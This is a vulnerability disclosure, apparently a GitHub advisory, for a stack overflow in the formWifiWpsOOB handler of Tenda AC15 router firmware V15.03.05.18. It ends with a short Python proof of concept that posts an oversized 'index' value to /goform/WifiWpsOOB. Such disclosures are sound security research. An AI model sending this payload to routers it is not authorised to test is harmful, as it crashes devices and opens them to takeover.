## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2710.html

## Affected version

AC15 V15.03.05.18

## Vulnerability details

The Tenda AC15 V15.03.05.18 firmware has a stack overflow vulnerability in the `formWifiWpsOOB` function. The `nptr` variable receives the `index` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `nptr` can trigger this security vulnerability.

![image-20240306172913194](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306172913194.png)

![image-20240314222418719](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314222418719.png)

![image-20240306172902301](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306172902301.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WifiWpsOOB"
payload = b"a"*2000

data = {"index": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240314222742830](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314222742830.png)